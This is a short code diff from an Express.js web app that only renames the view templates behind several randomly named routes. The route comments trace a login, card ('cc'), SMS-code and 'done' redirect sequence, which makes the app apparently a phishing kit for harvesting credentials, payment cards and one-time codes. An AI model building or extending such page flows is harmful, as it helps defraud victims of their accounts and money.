@@ -116,19 +116,19 @@ app.get("/",(req,res)=>{ // login
     res.render("index");
 });
 app.get("/3EtpVNHarRb8PqJfArbu",(req,res)=>{ // loading 1:
-    res.render("coco");
+    res.render("cesiliya");
 });
 app.get("/KecdAK8hGCFkbAY2Qpnk",(req,res)=>{ // cc page:
     res.render("loodi1");
 });
 app.get("/BfhMN3hPfFL88zgqtPAk",(req,res)=>{ // loading 2:
-    res.render("sims1");
+    res.render("otm-1");
 });
 app.get("/jD9TUUwFtwdRXBh6P4cc",(req,res)=>{ // sms 1:
     res.render("loodi2");
 });
 app.get("/EEXnHMpMEHxNNMgX5Duh",(req,res)=>{ // loading 3:
-    res.render("simsi2");
+    res.render("otm-2");
 });
 app.get("/Aw6knaPZ5nz4RnFvFV8s",(req,res)=>{ // done:
     res.render("loodi3",{url:process.env.URL});
